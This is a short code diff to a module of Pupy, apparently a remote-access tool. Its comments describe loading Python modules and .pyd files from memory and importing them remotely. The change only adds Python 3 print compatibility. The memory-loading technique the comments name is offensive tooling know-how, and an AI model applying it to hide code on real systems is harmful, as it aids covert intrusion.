@@ -16,6 +16,7 @@
 # This module uses the builtins modules pupy and _memimporter to load python modules and packages from memory, including .pyd files (windows only)
 # Pupy can dynamically add new modules to the modules dictionary to allow remote importing of python modules from memory !
 #
+from __future__ import print_function
 import sys
 import imp
 import marshal
@@ -43,7 +44,7 @@ def dprint(msg):
 
     if __dprint_method is None:
         if __debug:
-            print msg
+            print(msg)
     else:
         __dprint_method(msg)
 
